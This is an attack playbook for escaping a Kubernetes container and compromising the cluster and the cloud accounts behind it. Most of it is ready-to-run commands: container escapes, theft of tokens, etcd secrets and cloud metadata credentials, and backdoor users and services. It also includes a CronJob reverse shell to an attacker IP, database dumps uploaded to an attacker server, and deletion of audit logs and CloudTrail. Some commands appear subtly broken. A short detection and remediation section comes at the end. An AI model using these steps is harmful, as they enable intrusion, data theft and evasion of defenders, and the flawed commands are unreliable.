# Kubernetes Container Escape to Cloud Infrastructure Compromise

## Executive Summary

This playbook documents an attack chain where an attacker gains access to a Kubernetes container running on managed Kubernetes service (EKS, AKS, GKE) and leverages container escape techniques to gain node access, then uses node privileges to compromise the underlying cloud infrastructure and associated services.

**Attack Complexity**: Very High  
**Timeline**: 2-4 hours  
**Detection Difficulty**: Very High  
**Business Impact**: Critical - full cluster compromise, cloud infrastructure access

---

## Attack Scenario

A developer accidentally runs an untrusted container image in Kubernetes cluster. The container includes a vulnerability that allows container escape. An attacker uses this to:

1. Escape container sandbox
2. Gain node-level code execution
3. Access Kubernetes secrets and service accounts
4. Compromise managed cloud services (RDS, S3, etc.)
5. Establish persistent backdoor at cloud level
6. Exfiltrate sensitive data

---

## Phase 1: Container Escape

### 1.1 Container Vulnerability Exploitation

**Known Escape Vectors:**
- CVE-2019-5736 (runc vulnerability)
- CVE-2021-22555 (Linux kernel netfilter)
- CVE-2021-4034 (pwnkit - polkit)
- CVE-2022-0492 (cgroup v2 escape)
- Docker socket exposure

```bash
# Inside container - check for vulnerable runc
docker --version
runc --version

# Check for docker.sock mount (common misconfiguration)
ls -la /var/run/docker.sock
docker ps  # If accessible, can create privileged containers

# Check kernel version for known vulnerabilities
uname -a
# If kernel < 5.10, vulnerable to CVE-2022-0492

# Check for capabilities that allow escape
getpcaps $$
capsh --print

# If CAP_SYS_PTRACE, can escape to parent process
# If CAP_SYS_ADMIN, can mount filesystems or use user namespaces
```

### 1.2 Exploit Kernel Vulnerability

```bash
# If CAP_SYS_ADMIN present, use runc exploit
# Compile runc exploit
gcc -o runc_escape runc_exploit.c

# Run exploit
./runc_escape

# Alternative: Use unshare for namespace escape
unshare -m /bin/bash
mount -t tmpfs tmpfs /tmp
# Can now write to host filesystem
```

### 1.3 Access Host Filesystem

```bash
# Once escaped, access host root filesystem
ls /
cd /

# Find Kubernetes service account
find / -name "token" 2>/dev/null | grep -i kube
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Access kubelet API
curl -k --cert /var/run/secrets/kubernetes.io/serviceaccount/client.crt \
  --key /var/run/secrets/kubernetes.io/serviceaccount/client.key \
  https://localhost:10250/pods

# If kubelet API is exposed, can execute pods on node
curl -k --cert /var/run/secrets/kubernetes.io/serviceaccount/client.crt \
  --key /var/run/secrets/kubernetes.io/serviceaccount/client.key \
  -X POST https://localhost:10250/exec/default/pod-name/container-name \
  -d 'cmd=/bin/bash'
```

### 1.4 Gain Node Root Access

```bash
# Check for kernel module loading capability
modprobe nfnetlink 2>/dev/null && echo "Can load modules"

# Use CVE-2021-22555 to gain root
gcc -o pwn pwn.c
./pwn

# Alternative: Use captured service account token
kubectl whoami
# If service account has cluster-admin, can already control cluster

# Check sudo without password
sudo -l

# If cgroup v2 available (CVE-2022-0492)
# Can escape to host namespace
python3 cgroup_escape.py
```

---

## Phase 2: Node-Level Persistence and Lateral Movement

### 2.1 Establish Node-Level Backdoor

```bash
# Create backdoor user on node
useradd -m -s /bin/bash -G docker,wheel backdoor
echo "backdoor:password123" | chpasswd

# Add SSH key for persistence
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3..." >> /root/.ssh/authorized_keys

# Create systemd service for persistent reverse shell
cat > /etc/systemd/system/system-update.service <<EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/root/system-update.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable service
systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service
```

### 2.2 Access Kubernetes Secrets from Node

```bash
# Find kubelet config
cat /etc/kubernetes/kubelet.conf
cat /etc/kubernetes/manifests/*.yaml | grep -i secret

# If etcd is running on node
ps aux | grep etcd

# Access etcd directly (if socket accessible)
ETCDCTL_API=3 etcdctl --endpoints=unix:///var/run/etcd.sock get / --prefix

# Extract all secrets from etcd
for secret in $(ETCDCTL_API=3 etcdctl --endpoints=unix:///var/run/etcd.sock \
  get /registry/secrets --prefix --keys-only | cut -d/ -f4); do
  echo "=== $secret ==="
  ETCDCTL_API=3 etcdctl --endpoints=unix:///var/run/etcd.sock \
    get /registry/secrets/default/$secret
done
```

### 2.3 Compromise Other Pods

```bash
# Create privileged pod for lateral movement
cat > /tmp/backdoor-pod.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: system-audit
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  serviceAccountName: backdoor
  containers:
  - name: audit
    image: ubuntu:latest
    securityContext:
      privileged: true
    command: ["/bin/bash"]
    args: ["-c", "while true; do sleep 10; done"]
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF

# Apply pod using kubelet API
curl -k --cert /var/run/secrets/kubernetes.io/serviceaccount/client.crt \
  --key /var/run/secrets/kubernetes.io/serviceaccount/client.key \
  -X POST https://localhost:10250/pods \
  -d @/tmp/backdoor-pod.yaml
```

### 2.4 Node Network Reconnaissance

```bash
# Discover cloud metadata service
# AWS EKS
curl http://169.254.169.254/latest/meta-data/

# Azure AKS
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP GKE
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Extract available credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
```

---

## Phase 3: Cloud Service Compromise via Node

### 3.1 AWS EKS Node Compromise

```bash
# From node, retrieve IAM role credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role

# Extract temporary credentials
AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role | \
  jq -r .AccessKeyId)
AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role | \
  jq -r .SecretAccessKey)
AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role | \
  jq -r .Token)

# Verify access
aws sts get-caller-identity

# Enumerate what node role can access
aws iam list-attached-role-policies --role-name eks-node-role

# Check if role can escalate
aws iam get-role-policy --role-name eks-node-role --policy-name NodeInstanceRole

# List RDS databases accessible
aws rds describe-db-instances --output table

# Get database master credentials
aws secretsmanager get-secret-value --secret-id prod/rds/password

# Connect to database
mysql -h db.rds.amazonaws.com -u admin -p $(aws secretsmanager get-secret-value \
  --secret-id prod/rds/password | jq -r .SecretString)

# Dump database
mysqldump -h db.rds.amazonaws.com -u admin -p$(aws secretsmanager get-secret-value \
  --secret-id prod/rds/password | jq -r .SecretString) --all-databases > db.sql
```

### 3.2 Azure AKS Node Compromise

```bash
# From node, retrieve managed identity credentials
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq

# Extract token and set in environment
ACCESS_TOKEN=$(curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  jq -r .access_token)

# Query Azure Resource Manager
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://management.azure.com/subscriptions/{subscription}/resourceGroups/{rg}/resources?api-version=2021-04-01"

# List databases
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://management.azure.com/subscriptions/{subscription}/resourceGroups/{rg}/providers/Microsoft.DBforMySQL/servers?api-version=2021-05-01"

# Get SQL database connection details
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://management.azure.com/subscriptions/{subscription}/providers/Microsoft.Sql/servers/{server}/databases/{db}?api-version=2019-06-01"

# List Key Vault contents
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://{keyvault}.vault.azure.net/secrets?api-version=2016-10-01"

# Get secret values
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://{keyvault}.vault.azure.net/secrets/{secret}?api-version=2016-10-01"
```

### 3.3 GCP GKE Node Compromise

```bash
# From node, retrieve service account credentials
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity

# Get access token
ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity)

# List all resources in current project
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/{PROJECT}/resources"

# Get Cloud SQL instances
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://sqladmin.googleapis.com/sql/v1beta4/projects/{PROJECT}/instances"

# Get database credentials from Cloud SQL
gcloud sql users list --instance={INSTANCE}
gcloud sql users describe root --instance={INSTANCE}

# Connect to Cloud SQL
cloud_sql_proxy -instances={PROJECT}:{REGION}:{INSTANCE}=tcp:3306

# Export BigQuery data
bq extract --project_id={PROJECT} {dataset}.{table} gs://attacker-bucket/table.csv

# Download Cloud Storage
gsutil cp -r gs://sensitive-data/ ./exfil/
```

---

## Phase 4: Cluster-Wide Persistence

### 4.1 Install Backdoor Service Account

```bash
# Create new service account with cluster-admin
kubectl create serviceaccount persistent-admin -n kube-system

# Bind to cluster-admin role
kubectl create clusterrolebinding persistent-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:persistent-admin

# Get token for this account
TOKEN=$(kubectl -n kube-system get secret $(kubectl -n kube-system get secret \
  | grep persistent-admin | awk '{print $1}') -o jsonpath='{.data.token}' | base64 -d)

# Store token for later access
echo "$TOKEN" > /tmp/persistent-token.txt
```

### 4.2 Install Webhook Persistence

```bash
# Create webhook that intercepts API requests
cat > /tmp/webhook-server.py <<EOF
#!/usr/bin/env python3
from flask import Flask, request, jsonify
import json

app = Flask(__name__)

@app.route('/mutate', methods=['POST'])
def mutate(request):
    # Inject backdoor into every pod
    admission_review = request.get_json()
    
    # Modify pod to include backdoor container
    patch = [
        {
            "op": "add",
            "path": "/spec/containers/0/env",
            "value": [
                {"name": "BACKDOOR_TOKEN", "value": "..."}
            ]
        }
    ]
    
    admission_response = {
        "allowed": True,
        "patch": json.dumps(patch),
        "patchType": "JSONPatch"
    }
    
    return jsonify(admission_response)

if __name__ == '__main__':
    app.run(ssl_context='adhoc', host='0.0.0.0', port=8443)
EOF

# Deploy webhook
kubectl apply -f webhook.yaml

# Create MutatingWebhookConfiguration
kubectl create validatingwebhookconfigurations backdoor-webhook
```

### 4.3 CronJob Persistence

```bash
# Create CronJob that runs every minute
cat > /tmp/persistence-cron.yaml <<EOF
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-maintenance
  namespace: kube-system
spec:
  schedule: "* * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: persistent-admin
          containers:
          - name: maintenance
            image: ubuntu:latest
            command:
            - /bin/bash
            - -c
            - |
              # Reverse shell back to attacker
              bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1
          restartPolicy: OnFailure
EOF

kubectl apply -f /tmp/persistence-cron.yaml
```

### 4.4 Network Policy Bypass

```bash
# If network policies restrict traffic, create exception
cat > /tmp/allow-exfil.yaml <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-exfiltration
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 443
  - to:
    - podSelector: {}
EOF

kubectl apply -f /tmp/allow-exfil.yaml
```

---

## Phase 5: Data Exfiltration

### 5.1 Extract Kubernetes Secrets

```bash
# Get all secrets from all namespaces
for ns in $(kubectl get ns --no-headers | awk '{print $1}'); do
  for secret in $(kubectl get secrets -n $ns --no-headers | awk '{print $1}'); do
    kubectl get secret $secret -n $ns -o json > /tmp/$ns-$secret.json
  done
done

# Parse and extract values
for f in /tmp/*.json; do
  jq '.data[] | @base64d' $f >> /tmp/all-secrets.txt
done
```

### 5.2 Extract etcd Directly

```bash
# If etcd is accessible
ETCDCTL_API=3 etcdctl --endpoints={ETCD_ENDPOINT} get --prefix / | \
  grep -E "password|secret|token|key" | tee /tmp/etcd-dump.txt

# Export all etcd data
ETCDCTL_API=3 etcdctl --endpoints={ETCD_ENDPOINT} snapshot save /tmp/etcd.db
```

### 5.3 Compromise Cloud Databases

```bash
# From node with cloud access, access RDS/Cloud SQL
# MySQL dump
mysqldump --all-databases --single-transaction -h {CLOUD_DB_HOST} \
  -u {USER} -p{PASSWORD} | gzip > /tmp/db-dump.sql.gz

# PostgreSQL dump
pg_dump --all --clean --if-exists --compress=9 \
  postgresql://{USER}:{PASSWORD}@{CLOUD_DB_HOST}/{DATABASE} \
  > /tmp/db-dump.sql.gz

# Upload to attacker infrastructure
curl -X POST -F "file=@/tmp/db-dump.sql.gz" \
  https://attacker-server/upload
```

### 5.4 Export Cluster Configuration

```bash
# Get cluster kubeconfig
kubectl config view --flatten --raw > /tmp/kubeconfig.yaml

# Get all RBAC definitions
kubectl get clusterroles,clusterrolebindings,roles,rolebindings -o yaml > /tmp/rbac.yaml

# Get all API resources
kubectl api-resources > /tmp/api-resources.txt

# Get node information
kubectl get nodes -o json > /tmp/nodes.json

# Upload everything
tar czf - /tmp/ | curl -X POST -F "file=@-" \
  https://attacker-server/upload
```

---

## Phase 6: Anti-Forensics

### 6.1 Delete Kubernetes Audit Logs

```bash
# Stop audit logging
kubectl set env deployment/kube-apiserver \
  --audit-log-path="" -n kube-system

# Delete audit logs from etcd
ETCDCTL_API=3 etcdctl --endpoints={ETCD_ENDPOINT} \
  del /audit/ --prefix

# Clear pod logs
kubectl logs -f {backdoor-pod} --tail=0

# Delete log files from nodes
ssh {NODE} 'rm -rf /var/log/pods/*'
ssh {NODE} 'rm -rf /var/log/containers/*'
```

### 6.2 Remove Kubernetes Resources

```bash
# Delete backdoor resources
kubectl delete pod system-audit -n kube-system
kubectl delete cron system-maintenance -n kube-system
kubectl delete sa persistent-admin -n kube-system
kubectl delete clusterrolebinding persistent-admin

# Delete webhook configurations
kubectl delete validatingwebhookconfigurations backdoor-webhook

# Remove from node
ssh {NODE} 'systemctl disable system-update.service'
ssh {NODE} 'rm -f /etc/systemd/system/system-update.service'
ssh {NODE} 'userdel -r backdoor'
```

### 6.3 Delete Cloud Audit Logs

```bash
# AWS CloudTrail
aws cloudtrail delete-trail --name {trail-name}

# Azure Activity Log
az monitor diagnostic-settings delete --name {setting}

# GCP Cloud Audit Logs
gcloud logging write {} {} --severity=ERROR --clear-log
```

---

## Detection Indicators

**Red flags for defenders:**

1. **Container escape attempts** - CVE exploitation attempts in container logs
2. **Unusual kubelet API calls** - Port 10250 access from containers
3. **Service account token access** - Reading /var/run/secrets outside normal context
4. **etcd access** - Direct etcd socket connections
5. **Metadata service queries** - Repeated 169.254.169.254 requests
6. **Pod escape detection** - Breakout attempts or privilege escalation
7. **Node modification** - New users, systemd services, SSH keys
8. **Bulk secret access** - Many secret GET requests
9. **API server anomalies** - Unauthorized admission webhooks
10. **Cloud credential usage** - Cloud CLI tools running on nodes

---

## Remediation

1. **Immediate containment**:
   - Cordon/drain affected nodes
   - Revoke node IAM roles immediately
   - Rotate all Kubernetes credentials
   - Delete all service account tokens

2. **Eradication**:
   - Delete compromised nodes and redeploy
   - Revoke compromised cloud credentials
   - Reset all cloud access policies
   - Update container images

3. **Recovery**:
   - Restore from clean backups
   - Rebuild cluster from scratch if possible
   - Implement least-privilege RBAC
   - Enable audit logging with immutable storage

4. **Prevention**:
   - Scan all container images for vulnerabilities
   - Implement Pod Security Policy/Network Policies
   - Restrict kubelet API access
   - Use managed Kubernetes with restricted node access
   - Implement admission controllers
   - Enable audit logging and monitoring
   - Restrict metadata service access from pods
